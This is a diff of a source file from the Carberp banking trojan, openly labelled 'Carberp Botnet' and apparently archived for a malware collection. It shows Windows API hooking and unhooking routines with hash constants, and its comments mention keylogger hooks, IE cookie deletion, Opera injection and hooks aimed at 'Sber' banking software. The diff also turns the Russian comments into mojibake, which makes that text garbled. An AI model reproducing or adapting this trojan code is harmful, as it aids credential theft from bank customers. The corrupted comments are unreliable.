@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "GetApi.h"
@@ -154,7 +165,7 @@ void WINAPI RestoreFuncs( WCHAR *Dll, DWORD *dwFuncMass, bool bIsSystem )
 	return;
 }
 /************************************************************************/
-//* Восстанавливает неэкспорируемую функцию по её VA                    */
+//* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ VA                    */
 void WINAPI UnhookFunc2( LPVOID hMap, WCHAR *Dll, DWORD dwProcVA )
 {
 	BYTE entryPointBytes[10];
@@ -190,7 +201,7 @@ void WINAPI UnhookFunc2( LPVOID hMap, WCHAR *Dll, DWORD dwProcVA )
 
 
 /************************************************************************/
-/* Восстанавливает вектор неэкспортируемых функций по их VA             */
+/* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ VA             */
 void WINAPI RestoreFuncs2( WCHAR *Dll, DWORD *dwFuncMass, bool bIsSystem )
 {
 	WCHAR *TempDll = CopyDllToTemp( Dll, bIsSystem );
@@ -355,7 +366,7 @@ WCHAR commdlg32_dll[]= {'c','o','m','d','l','g','3','2','.','d','l','l',0};
 #define C_DRAWTEXTEXA					0xEF7E3E57
 #define C_DRAWTEXTEXW					0xEF7E3E41
 
-//кейлогеровские хуки
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 #define C_PEEKMESSAGEA			0xD7A87C2C
 #define C_GETMESSAGEA			0xC8A274AC
 #define C_PEEKMESSAGEW			0xD7A87C3A
@@ -442,7 +453,7 @@ void UnhookUser32()
 	return;
 }
 
-/// Функции добавленные при добавлении RuBnk
+/// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ RuBnk
 //#ifdef RuBnkH
 void UnhookTranslateMessage()
 {
@@ -472,7 +483,7 @@ void UnhookShowWindow()
 }
 
 //#endif
-//удаление кукисов в ие
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ
 void UnhookCookie()
 {
 	DWORD dwUser32[] ={ C_DIALOGBOX_PARAMW, 0 };
@@ -486,8 +497,8 @@ void UnhookOpera(DWORD dwAddr)
 {
 	DWORD dwOpera[] ={ dwAddr, 0 };
 
-	// Opera.dll слинкована динамически, чтобы всё работало
-	// нужно подгрузить её в процесс раньше, чем браузер
+	// Opera.dll пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pLoadLibraryW(opera_dll);
 
 	RestoreFuncs2( opera_dll, dwOpera,  false );
@@ -510,7 +521,7 @@ void UnhookGetMessagePos()
  return;
 }
 /************************************************************************/
-//кейлогеровские хуки
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 void UnhookKeyLogger()
 {
 	DWORD dwUser32[] ={ C_PEEKMESSAGEA, C_GETMESSAGEA, C_PEEKMESSAGEW, C_GETMESSAGEW, 0 };
@@ -519,7 +530,7 @@ void UnhookKeyLogger()
 	return;
 }
 /************************************************************************/
-//хуки для Sber
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ Sber
 void UnhookSber()
 {
 	DWORD dwUser32[] ={ C_SHOWWINDOW, C_TRANSLATEMESSAGE,
